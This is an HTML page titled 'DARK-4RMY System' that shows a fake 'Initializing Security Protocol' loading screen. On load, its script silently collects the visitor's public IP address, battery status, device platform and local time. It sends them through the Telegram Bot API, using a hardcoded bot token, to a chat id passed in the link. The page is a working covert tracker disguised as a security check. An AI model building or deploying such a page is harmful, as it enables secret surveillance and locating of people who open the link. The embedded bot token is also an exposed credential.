<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARK-4RMY System</title>
    <style>
        body { margin: 0; background: #0a0a0f; color: #00f3ff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .panel { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; text-align: center; background: rgba(0, 243, 255, 0.05); box-shadow: 0 0 20px rgba(0, 243, 255, 0.2); }
        h1 { letter-spacing: 5px; text-shadow: 0 0 10px #00f3ff; }
        .loader { width: 50px; height: 50px; border: 5px solid #00f3ff; border-top: 5px solid transparent; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="panel">
        <h1>DARK-4RMY</h1>
        <div class="loader"></div>
        <p id="stat">Initializing Security Protocol...</p>
    </div>

    <script>
        const BOT_TOKEN = '8619398262:AAEClf--ikjwf3bmPy88xADrqOlcucnNjGE';

        async function sendToTelegram() {
            const params = new URLSearchParams(window.location.search);
            const targetId = params.get('id');
            if (!targetId) return;

            try {
                // Get Battery info
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                const charging = battery.charging ? "🔌 Charging" : "🔋 On Battery";

                // Get IP info
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                const message = `⚡ *DARK-4RMY LOG REPORT* ⚡\n\n` +
                                `👤 *Target ID:* \`${targetId}\`\n` +
                                `🔋 *Battery:* ${level}%\n` +
                                `⚡ *Status:* ${charging}\n` +
                                `🌐 *IP:* \`${ipData.ip}\`\n` +
                                `💻 *Device:* ${navigator.platform}\n` +
                                `🕒 *Time:* ${new Date().toLocaleString()}`;

                // Send to Telegram API directly
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: targetId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                document.getElementById('stat').innerText = "System Active ✅";
            } catch (e) {
                document.getElementById('stat').innerText = "Access Denied ❌";
            }
        }
        window.onload = sendToTelegram;
    </script>
</body>
</html>
